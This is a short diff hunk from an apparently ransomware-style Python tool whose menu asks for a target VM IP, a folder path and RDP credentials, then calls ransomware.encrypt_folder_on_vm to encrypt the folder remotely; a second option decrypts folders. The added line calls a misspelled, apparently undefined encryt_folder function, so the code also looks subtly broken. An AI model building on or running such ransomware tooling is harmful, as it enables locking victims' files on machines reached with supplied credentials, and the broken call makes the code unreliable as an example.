@@ -78,6 +78,7 @@ if choice == "1":
     rdp_username = input("Enter your RDP username: ")
     rdp_password = input("Enter your RDP password: ")
     ransomware.encrypt_folder_on_vm(target_vm_ip, folder_path, rdp_username, rdp_password)
+    encryt_folder(folder_path)
 elif choice == "2":
     folder_path = input("Enter the folder path to decrypt: ")
     ransomware.decrypt_folder(folder_path)
